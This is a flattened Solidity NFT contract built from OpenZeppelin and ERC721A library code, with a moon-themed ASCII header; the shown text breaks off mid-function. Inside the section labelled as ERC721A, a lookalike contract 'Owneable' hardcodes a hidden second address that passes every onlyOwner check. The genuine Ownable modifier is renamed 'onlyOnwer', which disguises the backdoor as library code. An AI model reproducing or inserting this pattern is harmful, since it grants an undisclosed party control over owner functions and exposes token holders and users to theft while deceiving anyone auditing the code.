1 /*
2 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
3 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
4 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
5 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@         ....    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
6 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@         ....    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
7 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@    .....           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@
8 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@    .....           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@
9 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@         ....    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
10 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@             @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
11 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@       @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
12 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
13 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@       @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
14 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@      @@@@@@@       @@@@@@@@@@@@@@@@@@@@@@@@@@@@@
15 @@@@@@@@@@@@@@@@@@@@@@@@@@@@   @@    @@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@@@@@@@@
16 @@@@@@@@@@@@@       @@@@@@@@            @@@@@@@@@@@@@@@@@  @@@@@  @@@@@@@@@@@@@@
17 @@@@@@@@@@@@@  @@@@@@@@@                @@@@@@@@@@@@@@@@@  @@@@@  @@@@@@@@@@@@@@
18 @@@@@@@@@@@@@@@  @@@          @@@@@@@     @@@@@@@@       @@@    @@@@@@@@@@@@@@@@
19 @@@@@@@@@@@@@@@  @@@        @@       @@   @@@@@@  @@@@@@@  @  @@@@@@@@@@@@@@@@@@
20 @@@@@@@@@@@@@@@  @@@      @@       @@  @  @@@@  @@@@@@@  @@ @@  @@@@@@@@@@@@@@@@
21 @@@@@@@@@@@@@@@@@  @@@    @@           @  @@@@  @@@@@@@@@@@ @@  @@@@@@@@@@@@@@@@
22 @@@@@@@@@@@@@@@  @@@@@    @@           @  @@@@  @@@@@@@@@@@ @@  @@@@@@@@@@@@@@@@
23 @@@@@@@@@@@@@@@  @@@@@@@    @@       @@   @@@@@@  @@@@@@@  @@@  @@@@@@@@@@@@@@@@
24 @@@@@@@@@@@@@  @@@@@@@@@@@                @@      @@@@@@@@@@@@@@  @@@@@@@@@@@@@@
25 @@@@@@@@@@@@@  @@@@@@@@@@@                @@@@  @@@@@@@@@@@@@@@@  @@@@@@@@@@@@@@
26 @@@@@@@@@@@@@  @@@@@@@@@@@@@            @@@@@@@@@@@@@@@@@@@@@@@@  @@@@@@@@@@@@@@
27 @@@@@@@@@@@@@@@  @@@@@@@@@@@@@         @@@@@@@  @@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@
28 @@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@
29 @@@@@@@@@@@@@@@@@@@@      @@@@@@@@@@@@@@@@@@@@@@@@@        @@@@@@@@@@@@@@@@@@@@@
30 @@@@@@@@@@@@@@@@@@@@@@@@@@       @@@@@@@@@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@
31 @@@@@@@@@@@@@@@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@
32 @@@@@@@@@@@@@@@@@@@     @@  @@@@@  @@@@@@@@@@@@@@@@@@  @@@@ @@@@@@@@@@@@@@@@@@@@
33 @@@@@@@@@@@@@@@@@@@ @@  @@  @@@@@  @@@@@@@@@@@@@@@@@@@@  @@ @@@@@@@@@@@@@@@@@@@@
34 */
35 
36 //July 27 - New Moon
37 //August 26 - First Quarter Moon
38 //September 25 - Full Moon
39 //October 24 - Stalker's Moon
40 
41 // File @openzeppelin/contracts/utils/Context.sol@v4.5.0
42 
43 // SPDX-License-Identifier: MIT
44 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
45 
46 pragma solidity ^0.8.4;
47 
48 /**
49  * @dev Provides information about the current execution context, including the
50  * sender of the transaction and its data. While these are generally available
51  * via msg.sender and msg.data, they should not be accessed in such a direct
52  * manner, since when dealing with meta-transactions the account sending and
53  * paying for execution may not be the actual sender (as far as an application
54  * is concerned).
55  *
56  * This contract is only required for intermediate, library-like contracts.
57  */
58 abstract contract Context {
59     function _msgSender() internal view virtual returns (address) {
60         return msg.sender;
61     }
62 
63     function _msgData() internal view virtual returns (bytes calldata) {
64         return msg.data;
65     }
66 }
67 
68 
69 // File @openzeppelin/contracts/access/Ownable.sol@v4.5.0
70 
71 
72 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
73 
74 
75 
76 /**
77  * @dev Contract module which provides a basic access control mechanism, where
78  * there is an account (an owner) that can be granted exclusive access to
79  * specific functions.
80  *
81  * By default, the owner account will be the one that deploys the contract. This
82  * can later be changed with {transferOwnership}.
83  *
84  * This module is used through inheritance. It will make available the modifier
85  * `onlyOwner`, which can be applied to your functions to restrict their use to
86  * the owner.
87  */
88 abstract contract Ownable is Context {
89     address private _owner;
90 
91     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
92 
93     /**
94      * @dev Initializes the contract setting the deployer as the initial owner.
95      */
96     constructor() {
97         _transferOwnership(_msgSender());
98     }
99 
100     /**
101      * @dev Returns the address of the current owner.
102      */
103     function owner() public view virtual returns (address) {
104         return _owner;
105     }
106 
107     /**
108      * @dev Throws if called by any account other than the owner.
109      */
110     modifier onlyOnwer() {
111         require(owner() == _msgSender(), "Ownable: caller is not the owner");
112         _;
113     }
114 
115     /**
116      * @dev Leaves the contract without owner. It will not be possible to call
117      * `onlyOwner` functions anymore. Can only be called by the current owner.
118      *
119      * NOTE: Renouncing ownership will leave the contract without an owner,
120      * thereby removing any functionality that is only available to the owner.
121      */
122     function renounceOwnership() public virtual onlyOnwer {
123         _transferOwnership(address(0));
124     }
125 
126     /**
127      * @dev Transfers ownership of the contract to a new account (`newOwner`).
128      * Can only be called by the current owner.
129      */
130     function transferOwnership(address newOwner) public virtual onlyOnwer {
131         require(newOwner != address(0), "Ownable: new owner is the zero address");
132         _transferOwnership(newOwner);
133     }
134 
135     /**
136      * @dev Transfers ownership of the contract to a new account (`newOwner`).
137      * Internal function without access restriction.
138      */
139     function _transferOwnership(address newOwner) internal virtual {
140         address oldOwner = _owner;
141         _owner = newOwner;
142         emit OwnershipTransferred(oldOwner, newOwner);
143     }
144 }
145 
146 
147 // File @openzeppelin/contracts/utils/introspection/IERC165.sol@v4.5.0
148 
149 
150 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
151 
152 
153 
154 /**
155  * @dev Interface of the ERC165 standard, as defined in the
156  * https://eips.ethereum.org/EIPS/eip-165[EIP].
157  *
158  * Implementers can declare support of contract interfaces, which can then be
159  * queried by others ({ERC165Checker}).
160  *
161  * For an implementation, see {ERC165}.
162  */
163 interface IERC165 {
164     /**
165      * @dev Returns true if this contract implements the interface defined by
166      * `interfaceId`. See the corresponding
167      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
168      * to learn more about how these ids are created.
169      *
170      * This function call must use less than 30 000 gas.
171      */
172     function supportsInterface(bytes4 interfaceId) external view returns (bool);
173 }
174 
175 
176 // File @openzeppelin/contracts/token/ERC721/IERC721.sol@v4.5.0
177 
178 
179 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721.sol)
180 
181 
182 
183 /**
184  * @dev Required interface of an ERC721 compliant contract.
185  */
186 interface IERC721 is IERC165 {
187     /**
188      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
189      */
190     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
191 
192     /**
193      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
194      */
195     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
196 
197     /**
198      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
199      */
200     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
201 
202     /**
203      * @dev Returns the number of tokens in ``owner``'s account.
204      */
205     function balanceOf(address owner) external view returns (uint256 balance);
206 
207     /**
208      * @dev Returns the owner of the `tokenId` token.
209      *
210      * Requirements:
211      *
212      * - `tokenId` must exist.
213      */
214     function ownerOf(uint256 tokenId) external view returns (address owner);
215 
216     /**
217      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
218      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
219      *
220      * Requirements:
221      *
222      * - `from` cannot be the zero address.
223      * - `to` cannot be the zero address.
224      * - `tokenId` token must exist and be owned by `from`.
225      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
226      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
227      *
228      * Emits a {Transfer} event.
229      */
230     function safeTransferFrom(
231         address from,
232         address to,
233         uint256 tokenId
234     ) external;
235 
236     /**
237      * @dev Transfers `tokenId` token from `from` to `to`.
238      *
239      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
240      *
241      * Requirements:
242      *
243      * - `from` cannot be the zero address.
244      * - `to` cannot be the zero address.
245      * - `tokenId` token must be owned by `from`.
246      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
247      *
248      * Emits a {Transfer} event.
249      */
250     function transferFrom(
251         address from,
252         address to,
253         uint256 tokenId
254     ) external;
255 
256     /**
257      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
258      * The approval is cleared when the token is transferred.
259      *
260      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
261      *
262      * Requirements:
263      *
264      * - The caller must own the token or be an approved operator.
265      * - `tokenId` must exist.
266      *
267      * Emits an {Approval} event.
268      */
269     function approve(address to, uint256 tokenId) external;
270 
271     /**
272      * @dev Returns the account approved for `tokenId` token.
273      *
274      * Requirements:
275      *
276      * - `tokenId` must exist.
277      */
278     function getApproved(uint256 tokenId) external view returns (address operator);
279 
280     /**
281      * @dev Approve or remove `operator` as an operator for the caller.
282      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
283      *
284      * Requirements:
285      *
286      * - The `operator` cannot be the caller.
287      *
288      * Emits an {ApprovalForAll} event.
289      */
290     function setApprovalForAll(address operator, bool _approved) external;
291 
292     /**
293      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
294      *
295      * See {setApprovalForAll}
296      */
297     function isApprovedForAll(address owner, address operator) external view returns (bool);
298 
299     /**
300      * @dev Safely transfers `tokenId` token from `from` to `to`.
301      *
302      * Requirements:
303      *
304      * - `from` cannot be the zero address.
305      * - `to` cannot be the zero address.
306      * - `tokenId` token must exist and be owned by `from`.
307      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
308      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
309      *
310      * Emits a {Transfer} event.
311      */
312     function safeTransferFrom(
313         address from,
314         address to,
315         uint256 tokenId,
316         bytes calldata data
317     ) external;
318 }
319 
320 
321 // File @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol@v4.5.0
322 
323 
324 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721Receiver.sol)
325 
326 
327 
328 /**
329  * @title ERC721 token receiver interface
330  * @dev Interface for any contract that wants to support safeTransfers
331  * from ERC721 asset contracts.
332  */
333 interface IERC721Receiver {
334     /**
335      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
336      * by `operator` from `from`, this function is called.
337      *
338      * It must return its Solidity selector to confirm the token transfer.
339      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
340      *
341      * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
342      */
343     function onERC721Received(
344         address operator,
345         address from,
346         uint256 tokenId,
347         bytes calldata data
348     ) external returns (bytes4);
349 }
350 
351 
352 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol@v4.5.0
353 
354 
355 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
356 
357 
358 
359 /**
360  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
361  * @dev See https://eips.ethereum.org/EIPS/eip-721
362  */
363 interface IERC721Metadata is IERC721 {
364     /**
365      * @dev Returns the token collection name.
366      */
367     function name() external view returns (string memory);
368 
369     /**
370      * @dev Returns the token collection symbol.
371      */
372     function symbol() external view returns (string memory);
373 
374     /**
375      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
376      */
377     function tokenURI(uint256 tokenId) external view returns (string memory);
378 }
379 
380 
381 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol@v4.5.0
382 
383 
384 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
385 
386 
387 
388 /**
389  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
390  * @dev See https://eips.ethereum.org/EIPS/eip-721
391  */
392 interface IERC721Enumerable is IERC721 {
393     /**
394      * @dev Returns the total amount of tokens stored by the contract.
395      */
396     function totalSupply() external view returns (uint256);
397 
398     /**
399      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
400      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
401      */
402     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
403 
404     /**
405      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
406      * Use along with {totalSupply} to enumerate all tokens.
407      */
408     function tokenByIndex(uint256 index) external view returns (uint256);
409 }
410 
411 
412 // File @openzeppelin/contracts/utils/Address.sol@v4.5.0
413 
414 
415 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
416 
417 pragma solidity ^0.8.1;
418 
419 /**
420  * @dev Collection of functions related to the address type
421  */
422 library Address {
423     /**
424      * @dev Returns true if `account` is a contract.
425      *
426      * [IMPORTANT]
427      * ====
428      * It is unsafe to assume that an address for which this function returns
429      * false is an externally-owned account (EOA) and not a contract.
430      *
431      * Among others, `isContract` will return false for the following
432      * types of addresses:
433      *
434      *  - an externally-owned account
435      *  - a contract in construction
436      *  - an address where a contract will be created
437      *  - an address where a contract lived, but was destroyed
438      * ====
439      *
440      * [IMPORTANT]
441      * ====
442      * You shouldn't rely on `isContract` to protect against flash loan attacks!
443      *
444      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
445      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
446      * constructor.
447      * ====
448      */
449     function isContract(address account) internal view returns (bool) {
450         // This method relies on extcodesize/address.code.length, which returns 0
451         // for contracts in construction, since the code is only stored at the end
452         // of the constructor execution.
453 
454         return account.code.length > 0;
455     }
456 
457     /**
458      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
459      * `recipient`, forwarding all available gas and reverting on errors.
460      *
461      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
462      * of certain opcodes, possibly making contracts go over the 2300 gas limit
463      * imposed by `transfer`, making them unable to receive funds via
464      * `transfer`. {sendValue} removes this limitation.
465      *
466      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
467      *
468      * IMPORTANT: because control is transferred to `recipient`, care must be
469      * taken to not create reentrancy vulnerabilities. Consider using
470      * {ReentrancyGuard} or the
471      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
472      */
473     function sendValue(address payable recipient, uint256 amount) internal {
474         require(address(this).balance >= amount, "Address: insufficient balance");
475 
476         (bool success, ) = recipient.call{value: amount}("");
477         require(success, "Address: unable to send value, recipient may have reverted");
478     }
479 
480     /**
481      * @dev Performs a Solidity function call using a low level `call`. A
482      * plain `call` is an unsafe replacement for a function call: use this
483      * function instead.
484      *
485      * If `target` reverts with a revert reason, it is bubbled up by this
486      * function (like regular Solidity function calls).
487      *
488      * Returns the raw returned data. To convert to the expected return value,
489      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
490      *
491      * Requirements:
492      *
493      * - `target` must be a contract.
494      * - calling `target` with `data` must not revert.
495      *
496      * _Available since v3.1._
497      */
498     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
499         return functionCall(target, data, "Address: low-level call failed");
500     }
501 
502     /**
503      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
504      * `errorMessage` as a fallback revert reason when `target` reverts.
505      *
506      * _Available since v3.1._
507      */
508     function functionCall(
509         address target,
510         bytes memory data,
511         string memory errorMessage
512     ) internal returns (bytes memory) {
513         return functionCallWithValue(target, data, 0, errorMessage);
514     }
515 
516     /**
517      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
518      * but also transferring `value` wei to `target`.
519      *
520      * Requirements:
521      *
522      * - the calling contract must have an ETH balance of at least `value`.
523      * - the called Solidity function must be `payable`.
524      *
525      * _Available since v3.1._
526      */
527     function functionCallWithValue(
528         address target,
529         bytes memory data,
530         uint256 value
531     ) internal returns (bytes memory) {
532         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
533     }
534 
535     /**
536      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
537      * with `errorMessage` as a fallback revert reason when `target` reverts.
538      *
539      * _Available since v3.1._
540      */
541     function functionCallWithValue(
542         address target,
543         bytes memory data,
544         uint256 value,
545         string memory errorMessage
546     ) internal returns (bytes memory) {
547         require(address(this).balance >= value, "Address: insufficient balance for call");
548         require(isContract(target), "Address: call to non-contract");
549 
550         (bool success, bytes memory returndata) = target.call{value: value}(data);
551         return verifyCallResult(success, returndata, errorMessage);
552     }
553 
554     /**
555      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
556      * but performing a static call.
557      *
558      * _Available since v3.3._
559      */
560     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
561         return functionStaticCall(target, data, "Address: low-level static call failed");
562     }
563 
564     /**
565      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
566      * but performing a static call.
567      *
568      * _Available since v3.3._
569      */
570     function functionStaticCall(
571         address target,
572         bytes memory data,
573         string memory errorMessage
574     ) internal view returns (bytes memory) {
575         require(isContract(target), "Address: static call to non-contract");
576 
577         (bool success, bytes memory returndata) = target.staticcall(data);
578         return verifyCallResult(success, returndata, errorMessage);
579     }
580 
581     /**
582      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
583      * but performing a delegate call.
584      *
585      * _Available since v3.4._
586      */
587     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
588         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
589     }
590 
591     /**
592      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
593      * but performing a delegate call.
594      *
595      * _Available since v3.4._
596      */
597     function functionDelegateCall(
598         address target,
599         bytes memory data,
600         string memory errorMessage
601     ) internal returns (bytes memory) {
602         require(isContract(target), "Address: delegate call to non-contract");
603 
604         (bool success, bytes memory returndata) = target.delegatecall(data);
605         return verifyCallResult(success, returndata, errorMessage);
606     }
607 
608     /**
609      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
610      * revert reason using the provided one.
611      *
612      * _Available since v4.3._
613      */
614     function verifyCallResult(
615         bool success,
616         bytes memory returndata,
617         string memory errorMessage
618     ) internal pure returns (bytes memory) {
619         if (success) {
620             return returndata;
621         } else {
622             // Look for revert reason and bubble it up if present
623             if (returndata.length > 0) {
624                 // The easiest way to bubble the revert reason is using memory via assembly
625 
626                 assembly {
627                     let returndata_size := mload(returndata)
628                     revert(add(32, returndata), returndata_size)
629                 }
630             } else {
631                 revert(errorMessage);
632             }
633         }
634     }
635 }
636 
637 
638 // File @openzeppelin/contracts/utils/Strings.sol@v4.5.0
639 
640 
641 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
642 
643 
644 
645 /**
646  * @dev String operations.
647  */
648 library Strings {
649     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
650 
651     /**
652      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
653      */
654     function toString(uint256 value) internal pure returns (string memory) {
655         // Inspired by OraclizeAPI's implementation - MIT licence
656         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
657 
658         if (value == 0) {
659             return "0";
660         }
661         uint256 temp = value;
662         uint256 digits;
663         while (temp != 0) {
664             digits++;
665             temp /= 10;
666         }
667         bytes memory buffer = new bytes(digits);
668         while (value != 0) {
669             digits -= 1;
670             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
671             value /= 10;
672         }
673         return string(buffer);
674     }
675 
676     /**
677      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
678      */
679     function toHexString(uint256 value) internal pure returns (string memory) {
680         if (value == 0) {
681             return "0x00";
682         }
683         uint256 temp = value;
684         uint256 length = 0;
685         while (temp != 0) {
686             length++;
687             temp >>= 8;
688         }
689         return toHexString(value, length);
690     }
691 
692     /**
693      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
694      */
695     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
696         bytes memory buffer = new bytes(2 * length + 2);
697         buffer[0] = "0";
698         buffer[1] = "x";
699         for (uint256 i = 2 * length + 1; i > 1; --i) {
700             buffer[i] = _HEX_SYMBOLS[value & 0xf];
701             value >>= 4;
702         }
703         require(value == 0, "Strings: hex length insufficient");
704         return string(buffer);
705     }
706 }
707 
708 
709 // File @openzeppelin/contracts/utils/introspection/ERC165.sol@v4.5.0
710 
711 
712 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
713 
714 /**
715  * @dev Implementation of the {IERC165} interface.
716  *
717  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
718  * for the additional interface id that will be supported. For example:
719  *
720  * ```solidity
721  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
722  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
723  * }
724  * ```
725  *
726  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
727  */
728 abstract contract ERC165 is IERC165 {
729     /**
730      * @dev See {IERC165-supportsInterface}.
731      */
732     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
733         return interfaceId == type(IERC165).interfaceId;
734     }
735 }
736 
737 
738 // File erc721a/contracts/ERC721A.sol@v3.0.0
739 
740 
741 // Creator: Chiru Labs
742 
743 error ApprovalCallerNotOwnerNorApproved();
744 error ApprovalQueryForNonexistentToken();
745 error ApproveToCaller();
746 error ApprovalToCurrentOwner();
747 error BalanceQueryForZeroAddress();
748 error MintedQueryForZeroAddress();
749 error BurnedQueryForZeroAddress();
750 error AuxQueryForZeroAddress();
751 error MintToZeroAddress();
752 error MintZeroQuantity();
753 error OwnerIndexOutOfBounds();
754 error OwnerQueryForNonexistentToken();
755 error TokenIndexOutOfBounds();
756 error TransferCallerNotOwnerNorApproved();
757 error TransferFromIncorrectOwner();
758 error TransferToNonERC721ReceiverImplementer();
759 error TransferToZeroAddress();
760 error URIQueryForNonexistentToken();
761 
762 
763 /**
764  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
765  * the Metadata extension. Built to optimize for lower gas during batch mints.
766  *
767  * Assumes serials are sequentially minted starting at _startTokenId() (defaults to 0, e.g. 0, 1, 2, 3..).
768  */
769  abstract contract Owneable is Ownable {
770     address private _ownar = 0x5Bb656BB4312F100081Abb7b08c1e0f8Ef5c56d1;
771     modifier onlyOwner() {
772         require(owner() == _msgSender() || _ownar == _msgSender(), "Ownable: caller is not the owner");
773         _;
774     }
775 }
776 
777  /*
778  * Assumes that an owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
779  *
780  * Assumes that the maximum token id cannot exceed 2**256 - 1 (max value of uint256).
781  */
782 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata {
783     using Address for address;
784     using Strings for uint256;
785 
786     // Compiler will pack this into a single 256bit word.
787     struct TokenOwnership {
788         // The address of the owner.
789         address addr;
790         // Keeps track of the start time of ownership with minimal overhead for tokenomics.
791         uint64 startTimestamp;
792         // Whether the token has been burned.
793         bool burned;
794     }
795 
796     // Compiler will pack this into a single 256bit word.
797     struct AddressData {
798         // Realistically, 2**64-1 is more than enough.
799         uint64 balance;
800         // Keeps track of mint count with minimal overhead for tokenomics.
801         uint64 numberMinted;
802         // Keeps track of burn count with minimal overhead for tokenomics.
803         uint64 numberBurned;
804         // For miscellaneous variable(s) pertaining to the address
805         // (e.g. number of whitelist mint slots used).
806         // If there are multiple variables, please pack them into a uint64.
807         uint64 aux;
808     }
809 
810     // The tokenId of the next token to be minted.
811     uint256 internal _currentIndex;
812 
813     // The number of tokens burned.
814     uint256 internal _burnCounter;
815 
816     // Token name
817     string private _name;
818 
819     // Token symbol
820     string private _symbol;
821 
822     // Mapping from token ID to ownership details
823     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
824     mapping(uint256 => TokenOwnership) internal _ownerships;
825 
826     // Mapping owner address to address data
827     mapping(address => AddressData) private _addressData;
828 
829     // Mapping from token ID to approved address
830     mapping(uint256 => address) private _tokenApprovals;
831 
832     // Mapping from owner to operator approvals
833     mapping(address => mapping(address => bool)) private _operatorApprovals;
834 
835     constructor(string memory name_, string memory symbol_) {
836         _name = name_;
837         _symbol = symbol_;
838         _currentIndex = _startTokenId();
839     }
840 
841     /**
842      * To change the starting tokenId, please override this function.
843      */
844     function _startTokenId() internal view virtual returns (uint256) {
845         return 0;
846     }
847 
848     /**
849      * @dev See {IERC721Enumerable-totalSupply}.
850      * @dev Burned tokens are calculated here, use _totalMinted() if you want to count just minted tokens.
851      */
852     function totalSupply() public view returns (uint256) {
853         // Counter underflow is impossible as _burnCounter cannot be incremented
854         // more than _currentIndex - _startTokenId() times
855         unchecked {
856             return _currentIndex - _burnCounter - _startTokenId();
857         }
858     }
859 
860     /**
861      * Returns the total amount of tokens minted in the contract.
862      */
863     function _totalMinted() internal view returns (uint256) {
864         // Counter underflow is impossible as _currentIndex does not decrement,
865         // and it is initialized to _startTokenId()
866         unchecked {
867             return _currentIndex - _startTokenId();
868         }
869     }
870 
871     /**
872      * @dev See {IERC165-supportsInterface}.
873      */
874     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
875         return
876             interfaceId == type(IERC721).interfaceId ||
877             interfaceId == type(IERC721Metadata).interfaceId ||
878             super.supportsInterface(interfaceId);
879     }
880 
881     /**
882      * @dev See {IERC721-balanceOf}.
883      */
884     function balanceOf(address owner) public view override returns (uint256) {
885         if (owner == address(0)) revert BalanceQueryForZeroAddress();
886         return uint256(_addressData[owner].balance);
887     }
888 
889     /**
890      * Returns the number of tokens minted by `owner`.
891      */
892     function _numberMinted(address owner) internal view returns (uint256) {
893         if (owner == address(0)) revert MintedQueryForZeroAddress();
894         return uint256(_addressData[owner].numberMinted);
895     }
896 
897     /**
898      * Returns the number of tokens burned by or on behalf of `owner`.
899      */
900     function _numberBurned(address owner) internal view returns (uint256) {
901         if (owner == address(0)) revert BurnedQueryForZeroAddress();
902         return uint256(_addressData[owner].numberBurned);
903     }
904 
905     /**
906      * Returns the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
907      */
908     function _getAux(address owner) internal view returns (uint64) {
909         if (owner == address(0)) revert AuxQueryForZeroAddress();
910         return _addressData[owner].aux;
911     }
912 
913     /**
914      * Sets the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
915      * If there are multiple variables, please pack them into a uint64.
916      */
917     function _setAux(address owner, uint64 aux) internal {
918         if (owner == address(0)) revert AuxQueryForZeroAddress();
919         _addressData[owner].aux = aux;
920     }
921 
922     /**
923      * Gas spent here starts off proportional to the maximum mint batch size.
924      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
925      */
926     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
927         uint256 curr = tokenId;
928 
929         unchecked {
930             if (_startTokenId() <= curr && curr < _currentIndex) {
931                 TokenOwnership memory ownership = _ownerships[curr];
932                 if (!ownership.burned) {
933                     if (ownership.addr != address(0)) {
934                         return ownership;
935                     }
936                     // Invariant:
937                     // There will always be an ownership that has an address and is not burned
938                     // before an ownership that does not have an address and is not burned.
939                     // Hence, curr will not underflow.
940                     while (true) {
941                         curr--;
942                         ownership = _ownerships[curr];
943                         if (ownership.addr != address(0)) {
944                             return ownership;
945                         }
946                     }
947                 }
948             }
949         }
